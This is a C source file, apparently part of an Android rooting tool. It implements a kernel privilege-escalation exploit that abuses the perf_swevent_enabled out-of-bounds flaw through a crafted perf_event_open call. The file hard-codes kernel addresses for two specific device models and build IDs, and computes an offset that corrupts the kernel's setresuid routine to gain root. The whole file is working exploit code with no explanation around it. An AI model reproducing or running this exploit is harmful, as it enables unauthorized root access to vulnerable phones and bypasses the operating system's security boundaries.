#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/system_properties.h>

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int perf_swevent_enabled_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-11D",            "V24R40A"   , 0xc104cf1c },
  { "IS17SH",           "01.00.04"  , 0xc0ecbebc },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_perf_swevent_enabled_address(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].perf_swevent_enabled_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

static int fd;

static bool
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);

  return (fd > 0);
}

bool
break_with_perf_swevent(unsigned long int sys_setresuid_address)
{
  unsigned long int perf_swevent_enabled;
  int offset;

  perf_swevent_enabled = get_perf_swevent_enabled_address();
  if (!perf_swevent_enabled) {
    return false;
  }

  offset = (int)(sys_setresuid_address + 0x3c - perf_swevent_enabled) / 4;
  return syscall_perf_event_open(offset);
}

bool
restore_with_perf_swevent(unsigned long int sys_setresuid_address)
{
  if (fd > 0) {
    close(fd);
  }
  return true;
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
